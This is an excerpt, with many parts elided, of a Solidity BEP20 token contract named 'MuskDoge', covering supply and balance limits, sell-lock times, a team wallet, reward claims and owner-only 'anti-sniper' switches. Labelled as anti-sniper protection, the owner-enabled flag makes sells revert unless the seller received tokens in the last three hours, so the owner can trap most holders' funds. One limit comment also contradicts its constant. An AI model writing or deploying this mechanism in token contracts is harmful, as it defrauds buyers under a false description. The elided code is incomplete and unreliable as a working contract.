...
contract MuskDoge is IBEP20, Ownable
{
    ...
    //Token Info
    string private constant _name = 'MuskDoge';
    string private constant _symbol = 'MuskDoge';
    uint8 private constant _decimals = 9;
    uint256 public constant InitialSupply= 1000000 * 10**_decimals; //1,000,000

    //Divider for the MaxBalance based on circulating Supply 
    uint16 public constant BalanceLimitDivider=400; // 2,500 (0.25%)
    //Divider for sellLimit based on circulating Supply 
    uint16 public constant SellLimitDivider=1000; // 1,000 (0.25%)
    ...
    uint32 public constant MaxSellLockTime= 604800; // 7 days
    ...
    uint16 public constant MaxBuyLockTime= 120; // 120 Seconds
    //The time Liquidity gets locked at start and prolonged once it gets released
    uint256 private constant DefaultLiquidityLockTime= 10;
    //DevWallets
    address public TeamWallet=payable(0xe02d2Cc16fA7f2B96Dc0c3BCa5E980e8A0A84b40);
    //TestNet
    ...
    uint256 private antiSniperAt; // Time At anti-sniper enabled
    ...
    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        ...
        if(isSell){
            ...
            if (antiSniper) {
                  require(block.timestamp - lastReceived[sender] < 3 hours,"Seller in sellLock");
            }
            ...
            if(amount<=10**(_decimals)) claimREWARDS(sender);
            //Checks If the recipient balance(excluding Taxes) would exceed Balance Limit
            require(recipientBalance+amount<=balanceLimit,"whale protection");
    ...
    event OnWithdrawREWARDS(uint256 amount, address recipient);
    
    //withdraws all dividends of address
    function claimREWARDS(address addr) private{
        ...
        emit OnWithdrawREWARDS(amount, addr);
        _isWithdrawing=false;
    }
    ...
    //Anti-Sniper
    function SetupEnableSellSniper() public onlyOwner{
        antiSniper=true;
        antiSniperAt=block.timestamp;
    }

     function SetupDisableSellSniper() public onlyOwner{
        antiSniper=false;
        antiSniperAt=block.timestamp;
    }
